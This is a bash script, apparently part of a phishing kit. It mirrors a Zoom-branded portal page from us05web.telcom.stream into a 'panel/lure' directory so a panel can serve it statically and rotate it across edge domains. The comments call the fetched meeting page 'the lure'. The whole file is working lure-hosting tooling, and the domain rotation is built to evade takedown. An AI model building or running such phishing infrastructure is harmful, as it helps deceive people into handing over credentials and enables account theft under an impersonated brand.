#!/usr/bin/env bash
# Mirror the Zoom-portal front page into panel/lure so the panel can serve it
# statically (no Node at runtime) and rotate it across edge domains.
#
# usage: PORTAL=https://us05web.telcom.stream ./sync.sh
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="${OUT:-$DIR/../panel/lure}"
PORTAL="${PORTAL:-https://us05web.telcom.stream}"

command -v curl >/dev/null 2>&1 || { echo "curl required" >&2; exit 1; }

rm -rf "$OUT"
mkdir -p "$OUT"

# -L follows the portal's 307 to the meeting page; that page is the lure.
curl -fsSL --max-time 30 "$PORTAL/" -o "$OUT/index.html"
python3 "$DIR/collect.py" "$PORTAL" "$OUT"

echo "mirrored $(find "$OUT" -type f | wc -l) files ($(du -sh "$OUT" | cut -f1)) into $OUT"
